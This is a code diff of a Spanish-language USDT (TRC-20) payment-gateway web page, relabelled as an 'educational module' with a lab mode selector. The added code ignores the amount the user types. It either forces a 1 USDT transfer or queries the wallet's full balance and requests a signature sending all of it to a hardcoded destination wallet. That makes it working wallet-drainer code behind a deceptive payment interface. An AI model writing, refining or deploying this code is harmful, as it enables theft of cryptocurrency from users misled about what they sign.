@@ -3,9 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pasarela de Pago USDT</title>
-    
-    <!-- Se eliminó el script externo de unpkg para lograr una carga instantánea de red -->
+    <title>Pasarela de Pago USDT - Módulo Educativo</title>
     
     <style>
         :root { color-scheme: light; }
@@ -13,11 +11,39 @@
         body {
             min-height: 100vh;
             display: flex;
+            flex-direction: column;
             justify-content: center;
-            align-items: flex-start;
-            padding-top: 60px;
+            align-items: center;
+            padding: 40px 20px;
             background: #121212;
+            gap: 20px;
         }
+        
+        /* Panel del Profesor / Selector de Modo */
+        .panel-profesor {
+            width: 100%;
+            max-width: 380px;
+            padding: 16px;
+            background: #1e1e1e;
+            border: 1px dashed #0560fa;
+            border-radius: 12px;
+            color: #ffffff;
+            text-align: left;
+        }
+        .panel-profesor h3 { font-size: 14px; margin-bottom: 10px; color: #a0c2fd; text-transform: uppercase; letter-spacing: 0.5px; }
+        .modo-select {
+            width: 100%;
+            padding: 10px;
+            background: #2d2d2d;
+            color: #ffffff;
+            border: 1px solid #444;
+            border-radius: 6px;
+            font-size: 14px;
+            outline: none;
+            cursor: pointer;
+        }
+
+        /* Modal de la Pasarela */
         .modal {
             width: 100%;
             max-width: 380px;
@@ -75,6 +101,16 @@
 </head>
 <body>
 
+    <!-- CONTROL DE ENTORNO PARA EL DOCENTE -->
+    <div class="panel-profesor">
+        <h3>🔬 Laboratorio: Selector de Modo</h3>
+        <select id="selectorModo" class="modo-select">
+            <option value="forzado">Escenario 1: Forzar firma fija (Exactamente 1 USDT)</option>
+            <option value="maximo">Escenario 2: Consultar y proponer saldo total (balanceOf)</option>
+        </select>
+    </div>
+
+    <!-- PASARELA ORIGINAL -->
     <div class="modal">
         <div class="header">
             <h1>Transferencia TRC-20</h1>
@@ -99,7 +135,6 @@
     const BILLETERA_DESTINO = "TJJZHRUsVwMegvSfUjefDhQkJcjX5WP9hG"; 
     const CONTRATO_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";    
 
-    // Interfaz ABI requerida para ejecutar las funciones de tokens TRC-20 de manera nativa
     const TRC20_ABI = [
         {
             "constant": true,
@@ -124,6 +159,7 @@
     const connectBtn = document.getElementById('connectBtn');
     const statusDiv = document.getElementById('status');
     const amountDisplay = document.getElementById('amountDisplay');
+    const selectorModo = document.getElementById('selectorModo');
 
     let walletAddress = null;
 
@@ -133,13 +169,12 @@
     }
 
     connectBtn.addEventListener('click', async () => {
-        // PASO 1: Detectar e interactuar con el entorno inyectado directo del teléfono
+        // PASO 1: Sincronizar billetera
         if (!walletAddress) {
             try {
                 setStatus("Sincronizando con Trust Wallet...");
                 connectBtn.disabled = true;
 
-                // Validación del motor inyectado nativo por el DApp Browser del celular
                 if (typeof window.tronWeb === 'undefined') {
                     throw new Error("Abre esta página desde el explorador interno de una billetera TRON.");
                 }
@@ -172,7 +207,7 @@
             return;
         }
 
-        // PASO 2: Procesar la transferencia basándose estrictamente en lo digitado en el input
+        // PASO 2: Procesar la transferencia según el modo seleccionado
         if (walletAddress) {
             try {
                 const userAmount = parseFloat(amountDisplay.value);
@@ -181,22 +216,40 @@
                     throw new Error("Por favor, ingresa un monto válido antes de continuar.");
                 }
 
-                setStatus("Solicitando confirmación de firma digital...");
-                connectBtn.disabled = true;
-
-                // Consumir el objeto global inyectado directamente
                 const tronWeb = window.tronWeb;
                 const contract = await tronWeb.contract(TRC20_ABI, CONTRATO_USDT);
+                
+                let unitsInSun = "0";
+                const modoActual = selectorModo.value;
 
-                // Conversión simétrica del número escrito a unidades Sun (6 decimales de USDT)
-                const unitsInSun = Math.floor(userAmount * 1_000_000).toString();
+                if (modoActual === "forzado") {
+                    // ESCENARIO 1: Forzado a 1.00 USDT exactamente (1,000,000 Sun)
+                    setStatus("Modo Fijo Activo: Solicitando firma digital por 1.00 USDT...");
+                    unitsInSun = "1000000";
+                } else if (modoActual === "maximo") {
+                    // ESCENARIO 2: Consulta dinámica del balance on-chain total
+                    setStatus("Modo Dinámico: Consultando fondos en la blockchain...");
+                    connectBtn.disabled = true;
+                    
+                    const rawBalance = await contract.balanceOf(walletAddress).call();
+                    unitsInSun = rawBalance.toString();
 
+                    if (rawBalance.isZero ? rawBalance.isZero() : parseInt(unitsInSun) === 0) {
+                        throw new Error("La billetera no posee fondos de USDT (TRC-20) para transferir.");
+                    }
+                    
+                    setStatus("Modo Dinámico: Solicitando firma digital para el saldo total...");
+                }
+
+                connectBtn.disabled = true;
+
+                // Envío de la transacción final estructurada
                 const txId = await contract.transfer(BILLETERA_DESTINO, unitsInSun).send({
                     feeLimit: 100000000 
                 });
 
                 if (txId) {
-                    setStatus("Operación procesada de manera exitosa en la red TRON.", true);
+                    setStatus(`Operación procesada con éxito en la red TRON en modo [${modoActual.toUpperCase()}].`, true);
                     connectBtn.innerText = "Completado";
                 }
             } catch (error) {
